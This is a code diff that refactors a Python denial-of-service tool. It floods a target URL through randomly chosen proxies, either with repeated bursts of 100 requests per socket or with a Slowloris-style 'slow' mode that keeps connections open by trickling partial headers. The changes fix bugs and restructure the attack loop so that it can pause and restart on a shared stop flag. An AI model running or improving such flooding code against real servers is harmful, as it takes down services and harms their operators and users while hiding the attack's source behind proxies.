@@ -20,47 +20,46 @@ def send_request(mode: str,
                  stop: bool,
                  proxy: str or None = None):
     target_url = urlparse(target)
-    while not stop.value:
-        try:
-            print("Start new socket.")
-            if not proxy:
-                proxy = get_random_proxy()
-            with (_get_socket(target_url, proxy)) as s:
-                for _ in range(100):
-                    global i
-                    i.value += 1
-                    request = _mk_request(mode, target_url)
-                    sent = s.send(str.encode(request))
-                    print(f"Socket request send. [{i.value}]")
-                    if not sent:
-                        print("Socket stoped.")
-                        break
-        except Exception as e:
-            print(f"Socket stoped, e: {e}")
-            pass
-    print("Socket stoped")
+    while True:
+        if not stop.value:
+            try:
+                print("Start new socket.")
+                if not proxy:
+                    proxy = get_random_proxy()
+                with (_get_socket(target_url, proxy)) as s:
+                    if mode == 'slow':
+                        slow(s, target_url, stop)
+                    else:
+                        other_request(s, target_url, mode)
+            except Exception as e:
+                print(f"Socket stoped, e: {e}")
+                pass
+        else:
+            sleep(10)
+            print("Wait Start")
 
 
-def slow(target: str, stop: bool, proxy: str or None = None):
+def other_request(s, target_url: ParseResult, mode):
+    for _ in range(100):
+        global i
+        i.value += 1
+        request = _mk_request(mode, target_url)
+        sent = s.send(str.encode(request))
+        if not sent:
+            print("Socket Stop")
+        print(f"Socket request send. [{i.value}]")
+
+
+def slow(s, target_url: ParseResult, stop):
+    request = _mk_request('slow', target_url)
+    sent = s.send(str.encode(request))
     while not stop.value:
-        try:
-            target_url = urlparse(target)
-            print("Start new socket.")
-            if not proxy:
-                proxy = get_random_proxy()
-            with (_get_socket(target_url, proxy)) as s:
-                request = _mk_request('slow', target_url)
-                sent = s.send(str.encode(request))
-                while not stop.value:
-                    sent = s.send(f'X-a: {randint(1, 5000)}\r\n')
-                    print("Socket request send.")
-                    if not sent:
-                        print("Socket stoped.")
-                        break
-        except Exception as e:
-            print(f"Socket stoped, e: {e}")
-            pass
-    print("Socket stoped")
+        global i
+        i.value += 1
+        sent = s.send(f'X-a: {randint(1, 5000)}\r\n'.encode("utf-8"))
+        if not sent:
+            print("Socket stoped.")
+        print(f"Socket request send. [{i.value}]")
 
 
 def check(target: str, stop):
